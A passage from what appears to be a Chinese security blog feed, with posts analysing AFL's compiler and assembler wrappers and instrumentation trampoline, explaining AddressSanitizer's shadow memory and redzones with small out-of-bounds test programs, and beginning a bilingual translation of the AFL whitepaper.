class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c">...<br>    <br> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(name, <span class="hljs-string">&quot;afl-g++&quot;</span>)) &#123;<br>  u8* alt_cxx = getenv(<span class="hljs-string">&quot;AFL_CXX&quot;</span>);<br>  cc_params[<span class="hljs-number">0</span>] = alt_cxx ? alt_cxx : (u8*)<span class="hljs-string">&quot;g++&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(name, <span class="hljs-string">&quot;afl-gcj&quot;</span>)) &#123;<br>  u8* alt_cc = getenv(<span class="hljs-string">&quot;AFL_GCJ&quot;</span>);<br>  cc_params[<span class="hljs-number">0</span>] = alt_cc ? alt_cc : (u8*)<span class="hljs-string">&quot;gcj&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  u8* alt_cc = getenv(<span class="hljs-string">&quot;AFL_CC&quot;</span>);<br>  cc_params[<span class="hljs-number">0</span>] = alt_cc ? alt_cc : (u8*)<span class="hljs-string">&quot;gcc&quot;</span>;<br>&#125;<br><br>...<br>    <br>cc_params[cc_par_cnt++] = <span class="hljs-string">&quot;-B&quot;</span>;<br>cc_params[cc_par_cnt++] = as_path;<br><br>...<br></code></pre></td></tr></table></figure><p>总体逻辑比较简单，实际就是对参数做一些预处理，会用<code>gcc</code>替换<code>cc_params[0]</code>，利用<code>-B as_path</code>替换汇编器。因而在调用<code>execvp</code>执行命令时，本质上就是执行类似<code>gcc ... -B as_path ...</code>这样的效果。</p><h2 id="afl-as-c"><a href="#afl-as-c" class="headerlink" title="afl-as.c"></a>afl-as.c</h2><p>在理解<code>afl-gcc.c</code>之后，我们就自然而然会想到，核心点在于关注<code>afl-as</code>和默认as的区别。类似于afl-gcc，afl-as也是一个对as的封装</p><p>一些全局静态变量：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> u8** as_params;          <span class="hljs-comment">/* Parameters passed to the real &#x27;as&#x27;   */</span><br><br><span class="hljs-type">static</span> u8*  input_file;         <span class="hljs-comment">/* Originally specified input file      */</span><br><span class="hljs-type">static</span> u8*  modified_file;      <span class="hljs-comment">/* Instrumented file for the real &#x27;as&#x27;  */</span><br><br><span class="hljs-type">static</span> u8   be_quiet,           <span class="hljs-comment">/* Quiet mode (no stderr output)        */</span><br>            clang_mode,         <span class="hljs-comment">/* Running in clang mode?               */</span><br>            pass_thru,          <span class="hljs-comment">/* Just pass data through?              */</span><br>            just_version,       <span class="hljs-comment">/* Just show version?                   */</span><br>            sanitizer;          <span class="hljs-comment">/* Using ASAN / MSAN                    */</span><br><br><span class="hljs-type">static</span> u32  inst_ratio = <span class="hljs-number">100</span>,   <span class="hljs-comment">/* Instrumentation probability (%)      */</span><br>            as_par_cnt = <span class="hljs-number">1</span>;     <span class="hljs-comment">/* Number of params to &#x27;as&#x27;             */</span><br></code></pre></td></tr></table></figure><h3 id="main-1"><a href="#main-1" class="headerlink" title="main"></a>main</h3><p><code>main()</code>函数的核心主体如下，与afl-gcc.c中的<code>main</code>十分类似。比较明显，都是通过先对参数进行处理，然后调用<code>execvp()</code>去执行命令。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span> &#123;<br>  ...<br>  gettimeofday(&amp;tv, &amp;tz);<br><br>  rand_seed = tv.tv_sec ^ tv.tv_usec ^ getpid();<br><br>  srandom(rand_seed);<br><br>  edit_params(argc, argv);<br>  ...  <br><br>  <span class="hljs-keyword">if</span> (!just_version) add_instrumentation();<br><br>  <span class="hljs-keyword">if</span> (!(pid = fork())) &#123;<br><br>    execvp(as_params[<span class="hljs-number">0</span>], (<span class="hljs-type">char</span>**)as_params);<br>    FATAL(<span class="hljs-string">&quot;Oops, failed to execute &#x27;%s&#x27; - check your PATH&quot;</span>, as_params[<span class="hljs-number">0</span>]);<br><br>  &#125;<br>  ...<br><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>第一部分，比较明显，利用时间和pid即生成随机数</li><li><code>edit_params()</code>编辑参数</li><li><code>add_instrumentation()</code>插桩</li><li>最后利用execvp调用指令</li></ul><h3 id="edit-params-1"><a href="#edit-params-1" class="headerlink" title="edit_params"></a>edit_params</h3><p>与afl-gcc的逻辑基本一致，替换参数，不过多赘述，核心部分如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">edit_params</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span> &#123;<br>    ...<br>    <br>    as_params[<span class="hljs-number">0</span>] = afl_as ? afl_as : (u8*)<span class="hljs-string">&quot;as&quot;</span>;<br>    ...<br>    <br>    as_params[as_par_cnt++] = modified_file;<br>    <br>    as_params[as_par_cnt]   = <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="add-instrumentation"><a href="#add-instrumentation" class="headerlink" title="add_instrumentation"></a>add_instrumentation</h3><p>比较明显的看到其他部分与afl-gcc基本相同，因而我们关键来看看<code>add_instrumentation()</code>函数这部分内容。这个函数主要用于处理输入的文件，然后生成<strong>modified_file</strong>.并在恰当的地方插桩。此函数的核心部分如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">add_instrumentation</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    ...<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        匹配合适的插桩位置</span><br><span class="hljs-comment">        */</span><br>    ...<br>     <span class="hljs-keyword">while</span> (fgets(line, MAX_LINE, inf)) &#123;<br>     ...<br>            <br>        <span class="hljs-built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,<br>                R(MAP_SIZE));<br><br>    ins_lines++;<br>         <br>         ...<br>         <br>         <span class="hljs-keyword">continue</span>;<br>     &#125;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>从源代码的注释中我们也能看到，AFL插桩的位置偏好，主要为<strong>函数入口，分支标签，条件分支标签…….</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* If we&#x27;re in the right mood for instrumenting, check for function</span><br><span class="hljs-comment">   names or conditional labels. This is a bit messy, but in essence,</span><br><span class="hljs-comment">   we want to catch:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">     ^main:      - function entry point (always instrumented)</span><br><span class="hljs-comment">     ^.L0:       - GCC branch label</span><br><span class="hljs-comment">     ^.LBB0_0:   - clang branch label (but only in clang mode)</span><br><span class="hljs-comment">     ^\tjnz foo  - conditional branches</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   ...but not:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">     ^# BB#0:    - clang comments</span><br><span class="hljs-comment">     ^ # BB#0:   - ditto</span><br><span class="hljs-comment">     ^.Ltmp0:    - clang non-branch labels</span><br><span class="hljs-comment">     ^.LC0       - GCC non-branch labels</span><br><span class="hljs-comment">     ^.LBB0_0:   - ditto (when in GCC mode)</span><br><span class="hljs-comment">     ^\tjmp foo  - non-conditional jumps</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   Additionally, clang and GCC on MacOS X follow a different convention</span><br><span class="hljs-comment">   with no leading dots on labels, hence the weird maze of #ifdefs</span><br><span class="hljs-comment">   later on.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><p>在<code>add_instrumentation()</code>函数中的变量<code>trampoline_fmt_64</code>和<code>trampoline_fmt_32</code>即为插桩代码，我们可以在文件<strong>afl-as.h</strong>中找到定义，这里我们直接看看64位的插桩代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs assembly">/* --- AFL TRAMPOLINE (64-BIT) --- */<br><br>.align 4<br><br>leaq -(128+24)(%%rsp), %%rsp<br>movq %%rdx,  0(%%rsp)<br>movq %%rcx,  8(%%rsp)<br>movq %%rax, 16(%%rsp)<br>movq $0x%08x, %%rcx<br>call __afl_maybe_log<br>movq 16(%%rsp), %%rax<br>movq  8(%%rsp), %%rcx<br>movq  0(%%rsp), %%rdx<br>leaq (128+24)(%%rsp), %%rsp<br><br>/* --- END --- */<br></code></pre></td></tr></table></figure><p>流程非常简单易懂，大致如下：</p><ol><li>入栈保存寄存器</li><li><code>call __afl_maybe_log</code></li><li>出栈恢复寄存器</li></ol><p>这里直接来看看<code>__afl_maybe_log</code>函数，由于这段汇编逻辑过长，大概200多行。这里直接放<strong>ScUpax0s师傅</strong>的流程图</p><p><img src="/img/article/fuzzAFL1/image-20230830151452876.png" alt="image-20230830151452876"></p><p>流程图中涉及到的一些变量及含义如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.lcomm   __afl_area_ptr, 8/*共享内存地址*/<br>.lcomm   __afl_prev_loc, 8/*上一个插桩位置（id为R(100)随机数的值）*/<br>.lcomm   __afl_fork_pid, 4/*由fork产生的子进程的pid*/<br>.lcomm   __afl_temp, 4/*缓冲区*/<br>.lcomm   __afl_setup_failure, 1/*标志位，如果置位则直接退出*/<br>.comm    __afl_global_area_ptr, 8, 8/*全局指针*/<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【fuzz】ASAN原理解析</title>
    <link href="/2023/08/29/ASAN%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/"/>
    <url>/2023/08/29/ASAN%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>参考文章：</p><ul><li><a href="https://zhuanlan.zhihu.com/p/382994002">工欲善其事必先利其器——AddressSanitizer - 知乎 (zhihu.com)</a></li><li><a href="https://github.com/google/sanitizers/wiki/AddressSanitizer">google&#x2F;sanitizers(github.com)</a></li></ul></blockquote><p>本所涉及到的相关代码可以在我的仓库内找到：<a href="https://github.com/Loora1N/how2ASAN/blob/main/README.md">how2ASAN&#x2F;README.md at main · Loora1N&#x2F;how2ASAN (github.com)</a></p><h2 id="ASAN简介"><a href="#ASAN简介" class="headerlink" title="ASAN简介"></a>ASAN简介</h2><p>ASAN（Address Sanitizer）是针对 C&#x2F;C++ 的快速内存错误检测工具，在运行时检测 C&#x2F;C++ 代码中的多种内存错误。ASAN 早先是 LLVM 中的特性，后被集成到 GCC 4.8 中，在 4.9 版本中加入了对 ARM 平台的支持。</p><p>ASAN 目前支持的平台有 X86&#x2F;X86_64&#x2F;ARM&#x2F;ARM64，对于 ARM64 平台，Android 官方推荐使用 HWASan （HWAddress Sanitizer）。目前支持一下类型的内存错误：</p><ul><li>use-after-free</li><li>use-after-return</li><li>use-after-scope</li><li>heap-buffer-overflow</li><li>stack-buffer-overflow</li><li>global-buffer-overflow</li><li>Memory leaks</li><li>double-free</li><li>Initialization order bugs</li></ul><p>可以通过编译时，使用<code>clang</code>和<code>-fsanitize=address</code>参数开启此功能</p><h2 id="ASAN原理"><a href="#ASAN原理" class="headerlink" title="ASAN原理"></a>ASAN原理</h2><p>ASAN模块主要分为两个部分：</p><ul><li>instrument 静态插桩模块，对栈上对象、全局对象、动态分配的对象分配 redzone，以及针对这些内存做访问检测</li><li>runtime 运行时库，替换 <code>malloc</code>，<code>free</code>，<code>memcpy</code>，<code>memset</code>等实现、提供报错函数</li></ul><h3 id="插桩"><a href="#插桩" class="headerlink" title="插桩"></a>插桩</h3><p>ASAN会在涉及内存读写的地方进行插桩，比如如下代码（插桩前）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">*addr = ...;<br></code></pre></td></tr></table></figure><p>插桩后：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (IsPoisoned(addr)) &#123;<br>  ReportError(addr, kAccessSize, kIsWrite);<br>&#125;<br>*addr = ...; <span class="hljs-comment">// or ... = *addr;</span><br></code></pre></td></tr></table></figure><p>即通过<code>IsPoisoned()</code>函数来确定地址是否合法，而这个函数的实现依赖于<strong>shadow memory</strong>技术。</p><h3 id="shadow-memory"><a href="#shadow-memory" class="headerlink" title="shadow memory"></a>shadow memory</h3><p>在ASAN中，会将8字节内存映射1字节内存的方式创建<strong>shadow memory</strong>。用shadow memory中每个字节的值来代表实际内存中，所对应的8个字节的状态。shadow memory也会利用memmap映射到进程的虚拟内存中，实际换算关系如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">shadow_addr = (real_addr &gt; <span class="hljs-number">3</span>) + offset; <br></code></pre></td></tr></table></figure><ul><li>real_addr为实际访问地址，如堆栈地址</li><li>shadow_addr 指映射的shadow memory的存储地址</li><li>offset为一个偏移，是为了防止shadow memory与用户正常使用的地址出现重叠</li></ul><p>具体实现可以看这里<a href="https://github.com/llvm/llvm-project/blob/60c0256ef1875e62e91b7c1126f001a586225466/llvm/lib/Transforms/Instrumentation/AddressSanitizer.cpp#L459">AddressSanitizer.cpp (github.com)</a>的<code>getShadowMapping()</code>函数。</p><p>shadow memory的取值大致可以分为以下3种情况：</p><ul><li>0x00，代表该8字节可正常读写</li><li>小于8的正整数n，代表该8个字节中只有前n个字节可读写</li><li>负数，代表该区域不可读写。</li></ul><p>具体不同的数值有不同的含义，可以参考下图查看，再每次ASAN报错时也会输出此图的内容</p><p><img src="/img/article/asan/image-20230829165130934-1693299735767-3.png" alt="shadow memory取值"></p><h3 id="redzone-amp-posion"><a href="#redzone-amp-posion" class="headerlink" title="redzone &amp; posion"></a>redzone &amp; posion</h3><p>在上一节的图中，我们可以看到很多负数值对应着<strong>redzone</strong>，也就是不可读写的区域。ASAN将一些区域标记为<strong>redzone</strong>和<strong>posion</strong>状态，在读写操作前利用<code>IsPosioned(addr)</code>函数，检查addr所对应的<strong>shadow memory</strong>是否为redzone，以此达到溢出检测的效果。</p><h4 id="栈空间"><a href="#栈空间" class="headerlink" title="栈空间"></a>栈空间</h4><p>每创建一个新的栈帧，ASAN都会为栈额外分配一些redzone空间，分布在栈顶，局部变量之间，以及栈底。假设有如下主函数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">char</span> a[<span class="hljs-number">13</span>];<br>    <span class="hljs-type">char</span> b[<span class="hljs-number">13</span>];<br><br>    a[<span class="hljs-number">-1</span>] = <span class="hljs-number">0</span>;<br>    b[<span class="hljs-number">13</span>] = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>那么实际的栈内存和shadow memory下图所示，栈空间redzone创建会以32byte对齐:</p><p><img src="/img/article/asan/v2-2a937f952b8eab88609d9cba28c90959_720w.webp" alt="img"></p><blockquote><p>这图直接偷的知乎大佬，水印也留着，在本文开头有原文链接，侵删</p></blockquote><p>因为考虑到栈帧是存在重复利用的情况，因而在函数return之前，会将该栈帧的全部shadow memory清零，防止因为存留的redzone标记而影响到其他函数的调用。</p><h4 id="堆空间"><a href="#堆空间" class="headerlink" title="堆空间"></a>堆空间</h4><p>ASAN为了能够检测堆区域的的溢出、UAF等问题，也使用redzone进行标记。ASAN劫持了malloc和free，不使用ptmalloc进行内存管理，gdb调试时可以明显看到堆区域的不同寻常。堆块使用的分配方式，反而极像Kernel所使用的slab机制，即根据需要的size直接分配几种固定大小的chunk。</p><p>假设我们调用<code>malloc(0x13)</code>，其内存的效果图如下：</p><p><img src="/img/article/asan/v2-e52ecd469c349343f12e8db3d5cd45a8_720w.webp" alt="img"></p><blockquote><p>同上，侵删</p></blockquote><p>可以看到，ASAN在我们申请的地址之前，增加了固定16byte的redzone，然后以16byte对齐。</p><p>需注意的事，这里只有<strong>left redzone</strong>，且取代了ptmalloc的0x10大小的<strong>chunk header</strong>。但根据我在测试时发现，堆空间的redzone似乎在初始化时会全部标记为<code>0xfa</code>，即<strong>Heap left redzone</strong>。然后在malloc时，将用户使用空间取消posion。<strong>因而下个chunk的left redzone会充当上个chunk的right redzone，而最后一个chunk的right zone则是由初始化时设定的redzone进行限制。</strong></p><p>我使用的示例代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">13</span>);<br>    <span class="hljs-type">char</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">16</span>);<br>    p1[<span class="hljs-number">-1</span>] = <span class="hljs-string">&#x27;a&#x27;</span>; <span class="hljs-comment">//crash</span><br>    p1[<span class="hljs-number">13</span>] = <span class="hljs-string">&#x27;b&#x27;</span>; <span class="hljs-comment">//crash</span><br>    <span class="hljs-built_in">free</span>(p1);<br>    <span class="hljs-built_in">free</span>(p2);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>可以在这里看到<a href="https://github.com/Loora1N/how2ASAN/tree/main/heap-buffer-overflow">how2ASAN&#x2F;heap-buffer-overflow at main · Loora1N&#x2F;how2ASAN (github.com)</a></p></blockquote><p>报错的<strong>shadow memory</strong>为下图：</p><p><img src="/img/article/asan/image-20230829172316072.png" alt="image-20230829172316072"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【fuzz】AFL白皮书中英双语版</title>
    <link href="/2023/08/23/%E3%80%90fuzz%E3%80%91AFL%E7%99%BD%E7%9A%AE%E4%B9%A6%E4%B8%AD%E8%8B%B1%E5%8F%8C%E8%AF%AD%E7%89%88/"/>
    <url>/2023/08/23/%E3%80%90fuzz%E3%80%91AFL%E7%99%BD%E7%9A%AE%E4%B9%A6%E4%B8%AD%E8%8B%B1%E5%8F%8C%E8%AF%AD%E7%89%88/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>最近想研究研究AFL整体内部逻辑源码，面试时也遇到了同样的问题，决定从AFL白皮书开始看看。网上有很多翻译版，但是要不就是没写完，要不就是机翻痕迹太重。决定自己完成这个任务，争取在一周内完成大部分核心源码的分析。又想到之前看<a href="https://loora1n.github.io/2023/04/24/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0/">网络协议栈</a>和<a href="https://loora1n.github.io/2022/11/29/%E3%80%90IO_FILE%E3%80%91%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86%E6%A6%82%E8%A7%88/">IO_FILE</a>时的噩梦了😭😭😭</p></blockquote><p>本人英语水平有限，如有问题可以文末评论区直接指出。我想做中英双语版也是尽量在一定程度上防止大家被我的蹩脚翻译带偏。</p><p>白皮书的原文部分我都会使用markdown的引用语法，另外，全文使用AFL简写替代American fuzzy lop.</p><blockquote><p>AFL白皮书原文：<a href="https://lcamtuf.coredump.cx/afl/technical_details.txt">lcamtuf.coredump.cx&#x2F;afl&#x2F;technical_details.txt</a></p><p>AFL项目地址：<a href="https://github.com/google/AFL">google&#x2F;AFL: american fuzzy lop - a security-oriented fuzzer (github.com)</a></p><p>本文也部分参考：<a href="https://www.jianshu.com/p/cc7a486e5adb">翻译afl-fuzz白皮书 - 简书 (jianshu.com)</a></p></blockquote><h2 id="文档介绍"><a href="#文档介绍" class="headerlink" title="文档介绍"></a>文档介绍</h2><blockquote><p>This document provides a quick overview of the guts of American Fuzzy Lop. See README for the general instruction manual; and for a discussion of motivations and design goals behind AFL, see historical_notes.txt.</p></blockquote><p>本文档为AFL的内部结构提供了一个简要的概述。通用说明手册可以直接查阅README]部分，另外，有关AFL背后的设计目标和动机可以参阅hisrotical_notes.txt。</p><h2 id="0）Design-statement-设计说明"><a href="#0）Design-statement-设计说明" class="headerlink" title="0）Design statement 设计说明"></a>0）Design statement 设计说明</h2><blockquote><p>American Fuzzy Lop does its best not to focus on any singular principle of<br>operation and not be a proof-of-concept for any specific theory. The tool can<br>be thought of as a collection of hacks that have been tested in practice,<br>found to be surprisingly effective, and have been implemented in the simplest,<br>most robust way I could think of at the time</p></blockquote><p>AFL尽力不关注任何单一操作的原理，同时也不是任何特定理论的POC。这个工具可以看作是一个hack工具的集合，这些工具在实际的验证测试场景中非常有效，因此我用了那时我能想到的最简洁最具鲁棒性的方式实现设计了它。</p><blockquote><p>Many of the resulting features are made possible thanks to the availability of<br>lightweight instrumentation that served as a foundation for the tool, but this<br>mechanism should be thought of merely as a means to an end. The only true<br>governing principles are speed, reliability, and ease of use</p></blockquote><p>许多功能能够实现，都是多亏了将轻量化工具的可用性作为该项目的基础，但是这种机制应该仅仅被视作为了实现设计目的的一种手段。本项目真正的唯一的管理原则应是高效性、稳定性和易用性。</p><h2 id="1）Coverage-measurements-覆盖率测量"><a href="#1）Coverage-measurements-覆盖率测量" class="headerlink" title="1）Coverage measurements 覆盖率测量"></a>1）Coverage measurements 覆盖率测量</h2><blockquote><p>The instrumentation injected into compiled programs captures branch (edge)<br>coverage, along with coarse branch-taken hit counts. The code injected at<br>branch points is essentially equivalent to:</p></blockquote><p>通过向已编译程序注入检测代码来捕获代码分支（或边缘）的覆盖范围，同时粗略得记录分支命中计数。在分支点注入得代码本质上相当于如下伪代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">cur_location = &lt;COMPILE_TIME_RANDOM&gt;;<br>shared_mem[cur_location ^ prev_location]++; <br>prev_location = cur_location &gt;&gt; <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><blockquote><p>The cur_location value is generated randomly to simplify the process of<br>linking complex projects and keep the XOR output distributed uniformly.</p></blockquote><ul><li>cur_location 的值是随机生成的，以简化链接复杂项目的过程并保持 XOR 输出均匀分布。</li></ul><blockquote><p>The shared_mem[] array is a 64 kB SHM region passed to the instrumented binary<br>by the caller. Every byte set in the output map can be thought of as a hit for<br>a particular (branch_src, branch_dst) tuple in the instrumented code.</p></blockquote><ul><li>Shared_mem[] 数组是一个 64 kB SHM 区域，由调用者传递给已检测的二进制文件。输出映射中的每个字节集都可以被认为是检测代码中特定（branch_src，branch_dst）元组的命中。</li></ul><blockquote><p>The size of the map is chosen so that collisions are sporadic with almost all<br>of the intended targets, which usually sport between 2k and 10k discoverable<br>branch points:</p></blockquote><p>选择这个大小的映射，是为了统计几乎所有预测的目标的少量碰撞，而这些目标通常有2K到10K个可见的分支点：</p><table><thead><tr><th align="center">Branch cnt</th><th align="center">Colliding tuples</th><th align="center">Example targets</th></tr></thead><tbody><tr><td align="center">1,000</td><td align="center">0.75%</td><td align="center">giflib, lzo</td></tr><tr><td align="center">2,000</td><td align="center">1.5%</td><td align="center">zlib, tar, xz</td></tr><tr><td align="center">5,000</td><td align="center">3.5%</td><td align="center">libpng, libwebp</td></tr><tr><td align="center">10,000</td><td align="center">7%</td><td align="center">libxml</td></tr><tr><td align="center">20,000</td><td align="center">14%</td><td align="center">sqlite</td></tr><tr><td align="center">50,000</td><td align="center">30%</td><td align="center">-</td></tr></tbody></table><blockquote><p>At the same time, its size is small enough to allow the map to be analyzed<br>in a matter of microseconds on the receiving end, and to effortlessly fit<br>within L2 cache.</p></blockquote><p>同时，由于他的size足够的小，得以允许接收端可以在几微秒的时间内分析映射，并将其放入二级缓存中。</p><blockquote><p>This form of coverage provides considerably more insight into the execution<br>path of the program than simple block coverage. In particular, it trivially<br>distinguishes between the following execution traces:</p></blockquote><p>与简单的块覆盖相比，这种形式的覆盖可以更深入地了解程序的执行路径。特别是它可以轻易地区分以下执行流程:</p><ul><li>A -&gt; B -&gt; C -&gt; D -&gt; E (tuples: AB, BC, CD, DE)</li><li>A -&gt; B -&gt; D -&gt; C -&gt; E (tuples: AB, BD, DC, CE)</li></ul><blockquote><p>This aids the discovery of subtle fault conditions in the underlying code,<br>because security vulnerabilities are more often associated with unexpected<br>or incorrect state transitions than with merely reaching a new basic block.</p></blockquote><p>这有助于发现底层代码中的微妙故障情况，因为安全漏洞通常与意外或不正确的状态转换相关，而不是仅仅与到达新的基本块相关。</p><blockquote><p>The reason for the shift operation in the last line of the pseudocode shown<br>earlier in this section is to preserve the directionality of tuples (without<br>this, A ^ B would be indistinguishable from B ^ A) and to retain the identity<br>of tight loops (otherwise, A ^ A would be obviously equal to B ^ B).</p></blockquote><p>本节前面所示的伪代码最后一行中进行移位操作的原因是为了保留元组的方向性（没有这个，A ^ B 将与 B ^ A 无法区分）并保留紧密循环的标识（否则, A ^ A 显然等于 B ^ B)。</p><p><em><del>题外话，我不知道为什么大家都喜欢把这个地方的移位翻译成左移，不论是翻译还是代码层面都不应该出现这种错误吧</del></em></p><blockquote><p>The absence of simple saturating arithmetic opcodes on Intel CPUs means that<br>the hit counters can sometimes wrap around to zero. Since this is a fairly<br>unlikely and localized event, it’s seen as an acceptable performance trade-off.</p></blockquote><p>英特尔 CPU 上缺乏简单的饱和算术操作码，这意味着命中计数器有时会回滚到零。由于这是一个相当不可能发生的局部事件，因此它被视为可接受的性能权衡。</p><h2 id="2）Detecting-new-behaviors-检测新行为"><a href="#2）Detecting-new-behaviors-检测新行为" class="headerlink" title="2）Detecting new behaviors 检测新行为"></a>2）Detecting new behaviors 检测新行为</h2><blockquote><p>The fuzzer maintains a global map of tuples seen in previous executions; this<br>data can be rapidly compared with individual traces and updated in just a couple<br>of dword- or qword-wide instructions and a simple loop.</p></blockquote><p>模糊器维护先前执行中看到的元组的全局映射；该数据可以快速与单独的迹线进行比较，并只需几个dword或qword的指令和一个简单的循环即可更新。</p><blockquote><p>When a mutated input produces an 